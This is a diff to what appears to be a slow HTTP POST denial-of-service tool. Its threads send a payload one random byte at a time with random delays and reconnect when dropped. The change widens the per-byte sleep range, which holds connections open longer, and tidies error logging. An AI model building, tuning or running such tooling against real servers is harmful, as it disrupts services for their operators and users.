@@ -48,6 +48,9 @@ class HttpPostThread(Thread):
     def _log(self, msg):
         print(f'[Thread #{self.thread_id}] {msg}')
 
+    def _format_error_message(self, err):
+        return err.msg if hasattr(err, 'msg') else f'{err.errno} {err.strerror}'
+
     def _send_http_post(self):
         global stop_now
 
@@ -73,7 +76,7 @@ class HttpPostThread(Thread):
             p = random.choice(string.ascii_letters + string.digits)
             self._log(f'Posting byte {i + 1} out of {payload_length}: {p}')
             self.transport.send(p.encode())
-            time.sleep(random.uniform(0.1, 3))
+            time.sleep(random.uniform(0.5, 4))
 
         self.transport.close()
 
@@ -89,7 +92,7 @@ class HttpPostThread(Thread):
                     self._connect()
                     break
                 except Exception as e:
-                    self._log(f'Error connecting to {self.host}:{self.port}: {e.errno} {e.strerror}')
+                    self._log(f'Error connecting to {self.host}:{self.port}: {self._format_error_message(e)}')
                     self._init_socket()
                     time.sleep(1)
 
@@ -97,7 +100,7 @@ class HttpPostThread(Thread):
                 try:
                     self._send_http_post()
                 except Exception as e:
-                    self._log(f'Connection closed, error {e.errno} {e.strerror}. Restarting...')
+                    self._log(f'Connection closed, error: {self._format_error_message(e)}. Restarting...')
                     self._init_socket()
                     time.sleep(1)
                     break
